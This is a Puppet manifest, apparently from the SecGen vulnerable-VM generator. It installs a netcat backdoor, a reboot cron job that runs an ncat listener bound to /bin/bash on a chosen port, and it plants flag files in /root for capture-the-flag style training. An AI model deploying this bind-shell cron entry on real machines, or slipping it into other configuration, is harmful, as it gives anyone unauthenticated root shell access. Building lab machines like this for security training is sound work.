class nc_backdoor::install {
  $secgen_parameters = secgen_functions::get_parameters($::base64_inputs_file)
  $port = $secgen_parameters['port'][0]

  $strings_to_leak = $secgen_parameters['strings_to_leak']
  $leaked_filenames = $secgen_parameters['leaked_filenames']

  ensure_packages("nmap")
  case $operatingsystemrelease {
    /^(10).*/: { # do buster stuff
      ensure_packages("ncat")
    }
  }

  # run on each boot via cron
  cron { 'backdoor':
    command     => "sleep 60 && ncat -l -p $port -e /bin/bash -k &",
    special     => 'reboot',
  }

  ::secgen_functions::leak_files { "root-file-leak":
    storage_directory => "/root/",
    leaked_filenames  => $leaked_filenames,
    strings_to_leak   => $strings_to_leak,
    owner             => root,
    group             => root,
    mode              => '0600',
    leaked_from       => "accounts_root",
  }
}
